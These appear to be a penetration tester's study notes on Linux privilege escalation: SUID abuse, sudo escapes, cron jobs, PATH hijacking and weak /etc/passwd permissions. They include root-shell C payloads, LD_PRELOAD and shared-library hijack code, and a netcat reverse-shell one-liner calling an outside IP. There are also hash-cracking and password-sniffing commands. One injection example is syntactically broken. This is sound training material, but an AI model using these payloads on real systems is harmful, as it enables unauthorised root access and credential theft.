# Linux Privilege Escalation
-
		1. Check for binaries that have the suid bit set
	
In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.


------exploiting binaries w/o full paths---

Strings is a command on Linux that looks for human readable strings on a binary.

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

# Tib3rius Priv esc notes+
## File Permissions and Basic Enumeration
user accounts configured in /etc/passwd
user password hashes are stored in the /etc/shadow file
groups are configured in /etc/group
all files and directories have a single owner and group
directoreis
- exuecute: directory can be entered
- read: directory contents can be listed
- write: files and subdirectories can be created in the directory

Setuid (SUID bit): When set files get executed with privilege of owner
Setgid: when set on a file, file will execute with privilege of the file group. When set on a directory files created in the directory will inherit the group of the directory itself

permisions are 10 characters
	1st char is - for file d for dir
	next 9 characters are the 3 permissions for user, group, other
	if s is set in the execute position the suid/sgid is set

`id` command prints user / group ids
We can simply cat /etc/passwd to enumerate all users
How to read /etc/passwd output
- **Login Name**: "joe" - Indicates the username used for login.
- **Encrypted Password**: "x" - This field typically contains the hashed version of the user's password. In this case, the value _x_ means that the entire password hash is contained in the **/etc/shadow** file (more on that shortly).
- **UID**: "1000" - Aside from the root user that has always a UID of _0_, Linux starts counting regular user IDs from 1000. This value is also called _real user ID_.
- **GID**: "1000" - Represents the user's specific Group ID.
- **Comment**: "joe,,," - This field generally contains a description about the user, often simply repeating username information.
- **Home Folder**: "/home/joe" - Describes the user's home directory prompted upon login.
- **Login Shell**: "/bin/bash" - Indicates the default interactive shell, if one exists.

We can use netstat to list all listening services
```bash
netstat -anp
```
-a list all connections
-n avoid hostname resolution
-p list process name

Firewall rules may be able to be read under /etc/iptables if the file permission is weak

We can use `mount` to see mounted and unmounted file partitions --> we may need to investigate multiple partitions for priv esc details
## Spawning shells
spawning root shell
	one way to spawn root shell is to create a copy of the /bin/bash executable. Make sure it is owned by the root user and has the suid bit set. Then run the new executable with the -p option
	Custom executables
```c
	int main(){
		setuid(0);
		system("/bin/bash -p");
	}
```
The above C code will execute a bash shell running as root

msfvenom can be used to generate an executable .elf file
```bash
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```
The above code is for a reverse shell that must be caught with netcat or metasploit mutli handler
https://github.com/mthbernardes/rsg --> tool for suggesting reverse shells

Linux one liner
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```

linux smart enumeration (lse.sh): bash script which has multiple levels
	Link: https://github.com/diego-treitos/linux-smart-enumeration
	several options
	lse.sh will run with info option 0 --> will only show most interesting info
	lse.sh -l 1 will show more info

LinEnum: advanced bash script which extracts useful info and can copy interesting files
	Link: https://github.com/rebootuser/LinEnum
	 -e to set an export location
	-k to search for keyword

## Applications
We should enumerate all installed applications and note versions. We may be able to find publicly available exploits
dpkg or rpm should list all applications

## Kernel exploits
`cat /etc/issue` --> shows OS
`uname -a` --> shows kernel version
`arch` shows architecture type
then you can find exploits that match kernel version
kernel exploits can often be unstable and may be one shot or cause system to crash
should be last resort
linux exploit suggester 2: tool that is good at detailing vulnerable kernel exploits
We can use keywords with searchsploit to help search for vulns
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
Make sure we compile the exploit for the proper environment --> we can check the exploit itself for any compile instructions

## Service Exploits
Services are programs that run in the background, accpeting input or performing regular tasks
If vulnerable services are running as root, exploiting them can lead to command execution as root
Service exploits can be found with OSINT
```bash
ps aux | grep "^root"
```
Above command shows all services running as root
in some instances a root process may be bound to an internal port. If an exploit cannot run locally on he target machine we can use port forwarding via ssh to run on local machine
```bash
ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
```

Additonally, w ecan run `watch -n 1 "ps aux | grep pass"` to watch for services configured to run with hard coded credentials

We can see if we have privilege to run tcpdump and grep for passwords as well. Tcpdump is a privileged executable by default, since it needds raw sockets, but is often allowed for troubleshooting purposes
```bash
sudo tcpdump -i lo -A | grep "pass"
```
## weak file permisions
/etc/shadow contains user password hashes. if we can read contents we can crack hashes. If we can write the file we can write hashes we know
	crack the hash using john
```bash
john --format=<hash_type> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
/etc/passwd
	if the second field of the user row contains a password hash it takes precedent over /etc/shadow. If we can write to /etc/passwd we can enter a known passwd hash for root and then use su. Alternatively we can create a new user with uid 0 because linux will allow multiple users with the same uid
	root account is usually configured as follows
	root:x:0:0:root:/root:/bin/bash
	the 'x' in the second field instructs linux to look for the hash in /etc/shadow. In some versions of linux we can delete the 'x' which linux will interpret as the user having no password
	root::0:0:root:/root:/bin/bash
	or overwrite the x with a known hash
we can use openssl to generate a hashed password to paste into /etc/passwd
```bash
openssl passwd <password>
```

user may have created insecure backup files
	in /root we can look for backups
	/var/backups
	/tmp

We can also search for all directories writable by the current user to see if anything stands out.
```bash
find / -writable -type d 2>/dev/null
```

## Automated Enumeration
unix-privesc-check --> installed by default on kali under /usr/bin/unix-privesc-check
linPEAS :)
LinEnum


## sudo
sudo lets other users programs as root or other users
controlled by the etc/sudoers file
### Escape sequences
sudo -l lists the programs a user can run with sudo
if we are restricted to running certain programs as sudo we might be able to use a shell escape sequence to spawn a root shell
https://gtfobins.github.io/ lists binaries that can be exploited to create shells
check all commands a user can run a sudo against this resource ^^^
AppArmor may stop some of these attempts --> unsure how to check for this if not root, but it is run on Debian based systems starting with debian 10
### Abusing intended functionality
If a program doesn't have an escape sequence it may still be possible to escalate privileges
if we can read files owned by root, we may be able to extract sensitive data. If we write to files owned by root we can insert or modify info
apache 2 will print out an error with any line from a file it does not understand. --> this allows us to read the 1st line of root owned files
### environment variables
if env_keeper is set to LD_PRELOAD we can create a shared object that executes code automatically through an init() function
it will be loaded into memory and executed before anything else
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

compile into shared object 
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
now if we run a valid sudo command we will get a root shell. Example if find was an approved sudo command
```bash
sudo LD_PRELOAD=/tmp/preload.so find
```

### LD_LIBRARY_PATH
LD_LIBRARY_PATH variable contains a set of directories where shared libraries are searched for first
ldd command can e used to print the shared libraries used by a program. EX:
```bash
ldd /usr/sbin/apache2
```
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

To compile, note we are hijacking libcrypt.so.1
```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
## Cron Jobs
Cron jobs are programs are scripts that run at certain times or intervals
jobs run at the level of the user who owns them
ususaly located in
	/var/spool/cron
	/var/spool/cron/crontabs
	/etc/crontab
	/var/log/cron.log

**check syslog for cron jobs `grep "CRON" /var/log/syslog`**
**We can use the command `sudo crontab -l` to list cronjobs run by the root user**
Misconfiguration of file permisions can lead to easy priv esc if we can write to scripts or programs used by cronjob
If any scripts are world writeable simply add in a command for a reverse shell or copy an suid version of /bin/sh
### Path environment
Path can be overwritten in Crontab file
if crontab program or script does not use the absolute path, and one of the PATH directories is writeable we may be able to create program/script with the same name as the cron job
### wildcards
if there are any wild cards we can see create files to pass command line options
reference gtfobins to see if commands have command line options that can lead to escape sequences

### Binary versions
check versions of binaries used. Even if we cannot overwrite the binary, it may be a vulnerable version
## SUID/SGID Executables
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {}\; 2>/dev/null
find  / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
The above command will locate files with the SUID or SGID bits set
SUID allows a user to execute with rights of owner
SGID allows user to execute with rights of group
See if any of the files with suid bit have shell escape sequences on gtfobins
LD_PRELOAD and LD_LIBRARY_PATH get ignored for SUID files
use OSINT to look up security vulnerabilities for any unusual suid binaries
We can also look for capabilities using the following command
```
/usr/sbin/getcap -r / 2>/dev/null
```
capabilities are similar to having the SUID bit set
**If we have an suid binary that can edit files, we can edit root files like /etc/passwd**
## shared object injection
use strace to see if any suid programs are using shared objects
```bash
strace <binary> 2>&1 | grep -iE "open|access|no such file"
```
the above command will report if a program is using shared objects. If output is long we can run grep to look for certain words. 2>&1 redirects erros to stdout so we can see those as well
If a program is looking for a file that is currently not present we can create a malicious shared object
creating malicious shared object
- identify directory program is looking in for the object, confirm it's writeable
- create a file to write the program
	- example payload
	```bash
	#include <stdio.h>
	#include <stdlib.h>

	static void_inject() __attribute_((constructor));
	void inject();
		setuid(0);
		system("/bin/bash -p");
```
- compile file into shared objects
```bash
	gcc -shared -fPIC -o libcalc.so libcalc.c
```
- run suid program that calls the shared object
### Path Environment variable
Since a user has control ovet heir own path variable we can tell the shell to look in directories we can write to first
If an suid binary calls another script/command that does not have an absolute path we can create a malicious one and put it under the first directory in the path variable
run strings on executable file to find strings of characters
```bash
strings </path/to/file>
```
look through results for anything that looks like a command
can also use strace to confirm another program is getting called

prepends current directory to PATH
create and compile malicious executable. Example below
```c
int main(){
	setuid(0);
	system("/bin/bash -p");
}
```
In the same command prepend current directory to path and execute suid file
```bash
PATH=.:$PATH /path/to/file
```
### Bash Shell Vulnerabilities

## Finding Sensitive info
Sometimes credentials may be stored in environment variables --> use `env` to inspect
if w efind any credentials we can try using them with `su - root`
